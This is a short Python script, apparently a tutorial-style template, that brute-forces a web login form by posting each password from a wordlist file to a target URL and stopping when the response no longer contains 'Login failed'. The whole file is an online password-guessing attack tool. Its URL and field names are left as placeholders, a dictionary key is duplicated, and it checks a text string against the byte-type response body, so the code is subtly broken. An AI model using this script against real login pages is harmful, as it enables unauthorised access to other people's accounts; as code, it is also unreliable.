import requests


target_url = ""
data_dict = {"name_of_input": "blabla", "name_of input": "", "name_of_input": "submit"}

with open("file_name", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print('[+] Got the password --> ' + word)
            exit()

print("[+] Reached end of line")
